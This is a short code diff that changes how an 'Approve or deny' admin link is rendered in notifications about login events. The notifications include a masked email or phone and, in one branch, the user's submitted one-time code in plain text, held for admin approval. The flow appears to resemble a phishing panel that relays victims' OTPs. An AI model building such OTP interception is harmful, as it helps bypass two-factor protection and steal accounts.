@@ -161,7 +161,7 @@ ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data
 📧 Method: ${asCode(methodLabel)}
 ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
 
-👉 Approve or deny (${asLink(adminLink)}`
+👉 ${asLink(adminLink, 'Approve or deny')}`
   }
   // 1f) Login OTP submitted – second approval (admin must approve code before redirect)
   else if (data.type === 'login_otp_approval_request') {
@@ -176,7 +176,7 @@ ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data
 ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
 🔐 Code: ${asCode((data as { password?: string }).password)}
 
-👉 Approve or deny (${asLink(adminLink)}`
+👉 ${asLink(adminLink, 'Approve or deny')}`
   }
   // 1b) Register button clicked on home page
   else if (data.type === 'registration' && data.page === '/') {
